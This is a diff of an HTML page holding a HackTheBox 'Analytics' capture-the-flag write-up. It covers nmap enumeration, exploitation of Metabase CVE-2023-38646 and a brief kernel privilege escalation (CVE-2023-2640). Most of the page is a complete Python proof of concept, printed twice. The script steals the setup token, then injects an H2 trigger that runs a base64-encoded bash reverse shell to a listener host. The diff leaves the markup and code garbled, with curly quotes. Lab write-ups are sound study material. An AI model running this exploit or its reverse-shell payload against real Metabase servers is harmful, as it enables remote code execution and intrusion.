@@ -48,14 +48,6 @@
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
         
-  <div class="author-box">
-
-<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
-</div>
-
-</div>
-
-
 <div class="post">
   <h1 class="post-title">Analytics-Linux-Easy</h1>
   
@@ -74,140 +66,130 @@
 </aside>
 
 <h2 id="1-enumeration">1: Enumeration</h2>
-
+<p><br /><br /></p>
 <ul>
-  <li>nmap scanning</li>
+  <li>nmap scanning
+<br /><br />
+<img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled.png" alt="Untitled" />
+<br /><br />
+Let’s look around http service
+<br /><br />
+<img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_1.png" alt="Untitled" />
+<br /><br />
+A login interface change to this subdomain
+<br /><br />
+Metabase has a vulnerability (CVE-2023-38646)
+<br /><br />
+<img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_2.png" alt="Untitled" />
+<br /><br />
+    <h2 id="2-user-flag">2: User flag</h2>
+    <p><br /><br />
+Use this POC
+<br /><br />
+```bash
+import requests
+import argparse
+import base64
+import json
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from urllib.parse import urlparse</p>
+  </li>
 </ul>
 
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled.png" alt="Untitled" /></p>
+<p>requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</p>
 
-<p>Let’s look around http service</p>
-
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_1.png" alt="Untitled" /></p>
-
-<p>A login interface change to this subdomain</p>
-
-<p>Metabase has a vulnerability (CVE-2023-38646)</p>
-
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_2.png" alt="Untitled" /></p>
-
-<h2 id="2-user-flag">2: User flag</h2>
-
-<p>Use this POC</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
-import argparse
-import <span class="nb">base64
-</span>import json
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-from urllib.parse import urlparse
-
-requests.packages.urllib3.disable_warnings<span class="o">(</span>InsecureRequestWarning<span class="o">)</span>
-
-def get_setup_token_and_version<span class="o">(</span>ip_address<span class="o">)</span>:
-    endpoint <span class="o">=</span> <span class="s2">"/api/session/properties"</span>
-    url <span class="o">=</span> f<span class="s2">"{ip_address}{endpoint}"</span>
+<p>def get_setup_token_and_version(ip_address):
+    endpoint = “/api/session/properties”
+    url = f”{ip_address}{endpoint}”
     try:
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Fetching setup token from {url}..."</span><span class="o">)</span>
-        response <span class="o">=</span> requests.get<span class="o">(</span>url, <span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
-        <span class="k">if </span>response.status_code <span class="o">==</span> 200:
-            data <span class="o">=</span> response.json<span class="o">()</span>
-            setup_token <span class="o">=</span> data.get<span class="o">(</span><span class="s2">"setup-token"</span><span class="o">)</span>
-            metabase_version <span class="o">=</span> data.get<span class="o">(</span><span class="s2">"version"</span>, <span class="o">{})</span>.get<span class="o">(</span><span class="s2">"tag"</span><span class="o">)</span>
+        print(f”[DEBUG] Fetching setup token from {url}…”)
+        response = requests.get(url, verify=False)
+        if response.status_code == 200:
+            data = response.json()
+            setup_token = data.get(“setup-token”)
+            metabase_version = data.get(“version”, {}).get(“tag”)</p>
 
-            <span class="k">if </span>setup_token is None:
-                print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup token not found or is null for IP: {ip_address}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
-            <span class="k">else</span>:
-                print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup Token: {setup_token}"</span><span class="o">)</span>
-                print<span class="o">(</span>f<span class="s2">"[DEBUG] Version: {metabase_version}"</span><span class="o">)</span>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        if setup_token is None:
+            print(f"[DEBUG] Setup token not found or is null for IP: {ip_address}\n")
+        else:
+            print(f"[DEBUG] Setup Token: {setup_token}")
+            print(f"[DEBUG] Version: {metabase_version}")
 
-            <span class="k">return </span>setup_token
-    except requests.exceptions.RequestException as e:
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Exception occurred: {e}"</span><span class="o">)</span>
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Failed to connect to {ip_address}.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
-
-def post_setup_validate<span class="o">(</span>ip_address, setup_token, listener_ip, listener_port<span class="o">)</span>:
-    payload <span class="o">=</span> base64.b64encode<span class="o">(</span>f<span class="s2">"bash -c 'bash -i &gt;&amp;/dev/tcp/{listener_ip}/{listener_port} 0&gt;&amp;1'"</span>.encode<span class="o">())</span>.decode<span class="o">()</span>
-
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Payload = {payload}"</span><span class="o">)</span>
-
-    endpoint <span class="o">=</span> <span class="s2">"/api/setup/validate"</span>
-    url <span class="o">=</span> f<span class="s2">"{ip_address}{endpoint}"</span>
-    headers <span class="o">=</span> <span class="o">{</span><span class="s1">'Content-Type'</span>: <span class="s1">'application/json'</span><span class="o">}</span>
-    data <span class="o">=</span> <span class="o">{</span>
-        <span class="s2">"token"</span>: setup_token,
-        <span class="s2">"details"</span>: <span class="o">{</span>
-            <span class="s2">"is_on_demand"</span>: False,
-            <span class="s2">"is_full_sync"</span>: False,
-            <span class="s2">"is_sample"</span>: False,
-            <span class="s2">"cache_ttl"</span>: None,
-            <span class="s2">"refingerprint"</span>: False,
-            <span class="s2">"auto_run_queries"</span>: True,
-            <span class="s2">"schedules"</span>: <span class="o">{}</span>,
-            <span class="s2">"details"</span>: <span class="o">{</span>
-                <span class="s2">"db"</span>: f<span class="s2">"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1</span><span class="se">\\</span><span class="s2">;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS </span><span class="nv">$$</span><span class="s2">//javascript</span><span class="se">\n</span><span class="s2">java.lang.Runtime.getRuntime().exec('bash -c }||')</span><span class="se">\n</span><span class="nv">$$</span><span class="s2">--=x"</span>,
-                <span class="s2">"advanced-options"</span>: False,
-                <span class="s2">"ssl"</span>: True
-            <span class="o">}</span>,
-            <span class="s2">"name"</span>: <span class="s2">"test"</span>,
-            <span class="s2">"engine"</span>: <span class="s2">"h2"</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}"</span><span class="o">)</span>
-
-    try:
-        response <span class="o">=</span> requests.post<span class="o">(</span>url, <span class="nv">headers</span><span class="o">=</span>headers, <span class="nv">json</span><span class="o">=</span>data, <span class="nv">verify</span><span class="o">=</span>False<span class="o">)</span>
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Response received: {response.text}"</span><span class="o">)</span>
-        <span class="k">if </span>response.status_code <span class="o">==</span> 200:
-            print<span class="o">(</span>f<span class="s2">"[DEBUG] POST to {url} successful.</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
-        <span class="k">else</span>:
-            print<span class="o">(</span>f<span class="s2">"[DEBUG] POST to {url} failed with status code: {response.status_code}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
-    except requests.exceptions.RequestException as e:
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Exception occurred: {e}"</span><span class="o">)</span>
-        print<span class="o">(</span>f<span class="s2">"[DEBUG] Failed to connect to {url}</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
-
-def preprocess_url<span class="o">(</span>user_input<span class="o">)</span>:
-    parsed_url <span class="o">=</span> urlparse<span class="o">(</span>user_input<span class="o">)</span>
-    protocol <span class="o">=</span> f<span class="s2">"{parsed_url.scheme}://"</span> <span class="k">if </span>parsed_url.scheme <span class="k">else</span> <span class="s2">"http://"</span>
-    netloc <span class="o">=</span> parsed_url.netloc or parsed_url.path
-    <span class="k">return </span>protocol + netloc.rstrip<span class="o">(</span><span class="s1">'/'</span><span class="o">)</span>
-
-<span class="k">if </span>__name__ <span class="o">==</span> <span class="s2">"__main__"</span>:
-    parser <span class="o">=</span> argparse.ArgumentParser<span class="o">(</span><span class="nv">description</span><span class="o">=</span><span class="s1">'Check setup token'</span><span class="o">)</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'--rhost'</span>, <span class="nb">type</span><span class="o">=</span>str, <span class="nb">help</span><span class="o">=</span><span class="s1">'Metabase server IP address (including http:// or https:// and port number if needed)'</span><span class="o">)</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'--lhost'</span>, <span class="nb">type</span><span class="o">=</span>str, <span class="nb">help</span><span class="o">=</span><span class="s1">'Listener IP address'</span><span class="o">)</span>
-    parser.add_argument<span class="o">(</span><span class="s1">'--lport'</span>, <span class="nb">type</span><span class="o">=</span>int, <span class="nv">default</span><span class="o">=</span>4444, <span class="nb">help</span><span class="o">=</span><span class="s1">'Listener port (default is 4444)'</span><span class="o">)</span>
-    args <span class="o">=</span> parser.parse_args<span class="o">()</span>
-
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Original rhost: {args.rhost}"</span><span class="o">)</span>
-    args.rhost <span class="o">=</span> preprocess_url<span class="o">(</span>args.rhost<span class="o">)</span>
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Preprocessed rhost: {args.rhost}"</span><span class="o">)</span>
-
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Input Arguments - rhost: {args.rhost}, lhost: {args.lhost}, lport: {args.lport}"</span><span class="o">)</span>
-
-    setup_token <span class="o">=</span> get_setup_token_and_version<span class="o">(</span>args.rhost<span class="o">)</span>
-    print<span class="o">(</span>f<span class="s2">"[DEBUG] Setup token: {setup_token}"</span><span class="o">)</span>
-    <span class="k">if </span>setup_token:
-        post_setup_validate<span class="o">(</span>args.rhost, setup_token, args.lhost, args.lport<span class="o">)</span>
+        return setup_token
+except requests.exceptions.RequestException as e:
+    print(f"[DEBUG] Exception occurred: {e}")
+    print(f"[DEBUG] Failed to connect to {ip_address}.\n")
 </code></pre></div></div>
 
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_3.png" alt="Untitled" /></p>
+<p>def post_setup_validate(ip_address, setup_token, listener_ip, listener_port):
+    payload = base64.b64encode(f”bash -c ‘bash -i &gt;&amp;/dev/tcp/{listener_ip}/{listener_port} 0&gt;&amp;1’“.encode()).decode()</p>
 
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_4.png" alt="Untitled" /></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print(f"[DEBUG] Payload = {payload}")
 
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_5.png" alt="Untitled" /></p>
+endpoint = "/api/setup/validate"
+url = f"{ip_address}{endpoint}"
+headers = {'Content-Type': 'application/json'}
+data = {
+    "token": setup_token,
+    "details": {
+        "is_on_demand": False,
+        "is_full_sync": False,
+        "is_sample": False,
+        "cache_ttl": None,
+        "refingerprint": False,
+        "auto_run_queries": True,
+        "schedules": {},
+        "details": {
+            "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c }||')\n$$--=x",
+            "advanced-options": False,
+            "ssl": True
+        },
+        "name": "test",
+        "engine": "h2"
+    }
+}
 
-<h2 id="3-priv-esc">3: Priv esc</h2>
+print(f"[DEBUG] Sending request to {url} with headers {headers} and data {json.dumps(data, indent=4)}")
 
-<p><img src="/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_6.png" alt="Untitled" /></p>
+try:
+    response = requests.post(url, headers=headers, json=data, verify=False)
+    print(f"[DEBUG] Response received: {response.text}")
+    if response.status_code == 200:
+        print(f"[DEBUG] POST to {url} successful.\n")
+    else:
+        print(f"[DEBUG] POST to {url} failed with status code: {response.status_code}\n")
+except requests.exceptions.RequestException as e:
+    print(f"[DEBUG] Exception occurred: {e}")
+    print(f"[DEBUG] Failed to connect to {url}\n")
+</code></pre></div></div>
 
-<p>We see a kernel with an outdated version (CVE-2023-2640)</p>
+<p>def preprocess_url(user_input):
+    parsed_url = urlparse(user_input)
+    protocol = f”{parsed_url.scheme}://” if parsed_url.scheme else “http://”
+    netloc = parsed_url.netloc or parsed_url.path
+    return protocol + netloc.rstrip(‘/’)</p>
 
-<p>Just give it executable premises after downloaded it on tmp</p>
+<p>if <strong>name</strong> == “<strong>main</strong>”:
+    parser = argparse.ArgumentParser(description=’Check setup token’)
+    parser.add_argument(‘–rhost’, type=str, help=’Metabase server IP address (including http:// or https:// and port number if needed)’)
+    parser.add_argument(‘–lhost’, type=str, help=’Listener IP address’)
+    parser.add_argument(‘–lport’, type=int, default=4444, help=’Listener port (default is 4444)’)
+    args = parser.parse_args()</p>
 
-<p>We’ve got root flag
-<script src="/assets/js/matrix-overlay.js"></script></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print(f"[DEBUG] Original rhost: {args.rhost}")
+args.rhost = preprocess_url(args.rhost)
+print(f"[DEBUG] Preprocessed rhost: {args.rhost}")
+
+print(f"[DEBUG] Input Arguments - rhost: {args.rhost}, lhost: {args.lhost}, lport: {args.lport}")
+
+setup_token = get_setup_token_and_version(args.rhost)
+print(f"[DEBUG] Setup token: {setup_token}")
+if setup_token:
+    post_setup_validate(args.rhost, setup_token, args.lhost, args.lport) ``` &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_3.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_4.png) &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_5.png) &lt;br/&gt;&lt;br/&gt; ## 3: Priv esc &lt;br/&gt;&lt;br/&gt; ![Untitled](/assets/images/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c/af085d34-eb14-4082-ad9d-c42401a944e6-export-2938c4a6-fcb5-4b88-9b67-be33645a199c_Untitled_6.png) &lt;br/&gt;&lt;br/&gt; We see a kernel with an outdated version (CVE-2023-2640) &lt;br/&gt;&lt;br/&gt; Just give it executable premises after downloaded it on tmp &lt;br/&gt;&lt;br/&gt; We’ve got root flag &lt;script src="/assets/js/matrix-overlay.js"&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
